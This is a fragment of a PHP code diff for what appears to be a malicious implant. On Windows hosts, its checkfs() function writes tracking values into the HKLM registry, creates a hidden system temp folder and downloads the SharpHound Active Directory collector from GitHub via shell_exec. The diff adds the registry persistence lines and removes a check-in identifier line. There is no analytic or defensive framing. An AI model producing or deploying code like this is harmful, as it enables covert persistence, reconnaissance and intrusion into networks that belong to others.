@@ -7,8 +7,11 @@ define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
 function checkfs(){
     if (substr(php_uname(), 0, 7) == 'Windows') {
         $wh = new COM('WScript.Shell');
-        if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\"))) {
+        if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
             $t = sys_get_temp_dir() . "\\" . substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
+            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Version", "REG_SZ", "1");
+            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerPath", "REG_SZ", base64_encode($t));
+            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 48));
             shell_exec("mkdir " . $t);
             shell_exec("attrib +h +s " . $t);
             shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
@@ -40,7 +43,7 @@ function checkfs(){
 }
 
 function checkin_timer($time){
-    $uu = substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
+
 
 }
 
